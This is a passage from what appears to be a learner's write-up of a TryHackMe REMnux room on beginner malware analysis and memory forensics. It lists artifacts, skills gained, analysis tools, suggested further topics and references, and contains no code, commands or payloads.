- HTTP/HTTPS requests
- Payload downloads
- DNS queries
- Command and Control communication
- Suspicious outbound connections

---

## Memory Analysis

Artifacts commonly recovered include:

- Running malware processes
- Injected code
- PowerShell command lines
- Loaded DLLs
- Executable file paths
- Hidden processes

These artifacts help defenders reconstruct attacker activity after an incident.

---

# Skills Gained

By completing this room, I strengthened the following practical skills:

## Malware Analysis

- Static malware analysis
- Dynamic malware analysis
- Office document analysis
- VBA macro extraction
- PowerShell deobfuscation

---

## Digital Forensics

- Memory evidence preprocessing
- Windows memory forensics
- Artifact collection
- Evidence preparation
- Forensic workflow

---

## Networking

- HTTPS traffic analysis
- DNS simulation
- Network service emulation
- Fake internet environments

---

## Linux

- Bash scripting
- Command-line automation
- File processing
- Using forensic utilities

---

## DFIR

- Malware triage
- Evidence preprocessing
- IOC extraction
- Investigation workflow
- Incident response methodology

---

# Industry Relevance

The tools introduced in this room are widely used throughout the cybersecurity industry.

| Tool | Primary Use |
|------|-------------|
| REMnux | Malware Analysis Platform |
| oledump.py | Office Document Analysis |
| CyberChef | Data Transformation & Deobfuscation |
| INetSim | Network Service Simulation |
| Volatility 3 | Memory Forensics |
| strings | String Extraction |

Professionals working in the following roles frequently use these tools:

- Malware Analyst
- DFIR Analyst
- Incident Responder
- Threat Intelligence Analyst
- SOC Analyst
- Reverse Engineer

Learning these tools provides a strong foundation for advanced malware investigations.

---

# Future Learning Path

This room serves as an introduction rather than a comprehensive malware analysis course.

Recommended next topics include:

## Malware Analysis

- YARA Rule Development
- PE File Analysis
- Packed Malware
- Windows Internals
- Reverse Engineering
- x64dbg
- Ghidra
- IDA Free

---

## Memory Forensics

- Advanced Volatility Plugins
- Registry Analysis
- Network Connection Analysis
- Process Injection Detection
- Credential Extraction
- Timeline Analysis

---

## Dynamic Analysis

- Cuckoo Sandbox
- FakeNet-NG
- Procmon
- Process Explorer
- API Monitor

---

## Threat Hunting

- IOC Development
- Sigma Rules
- YARA Rules
- MITRE ATT&CK Mapping

Mastering these topics will significantly strengthen your malware analysis and DFIR capabilities.

---

# References

- TryHackMe — REMnux: Getting Started
- REMnux Documentation
- Volatility 3 Documentation
- INetSim Documentation
- Didier Stevens Suite (oledump.py)
- CyberChef
- Microsoft PowerShell Documentation

---

# Tags

```text
TryHackMe
REMnux
Malware Analysis
Digital Forensics
DFIR
Incident Response
Memory Forensics
Volatility 3
oledump.py
CyberChef
INetSim
PowerShell
VBA Macro
Static Analysis
Dynamic Analysis
Windows Memory
Threat Hunting
Reverse Engineering
Blue Team
Cybersecurity
```

---

# Final Thoughts

This room provides an excellent introduction to malware analysis using **REMnux**, one of the most widely recognized Linux distributions for malware analysis and digital forensics. While the exercises are beginner-friendly, they closely mirror the workflow used by professional Malware Analysts and DFIR teams during real incident investigations.

By combining **static analysis**, **dynamic analysis**, **network simulation**, and **memory preprocessing**, the room demonstrates that effective malware analysis is not about mastering a single tool—it is about understanding how multiple tools complement one another to reveal the complete behavior of malicious software.

For anyone pursuing a career in **Blue Team operations, Digital Forensics, Incident Response, or Malware Analysis**, this room establishes a strong foundation and prepares you for more advanced topics such as reverse engineering, threat hunting, and memory forensics.

--- 

**Room Status:** ✅ Completed  
**Difficulty:** Easy  
**Platform:** TryHackMe  
**Learning Focus:** Malware Analysis, Digital Forensics, Incident Response (DFIR), Memory Forensics, Network Simulation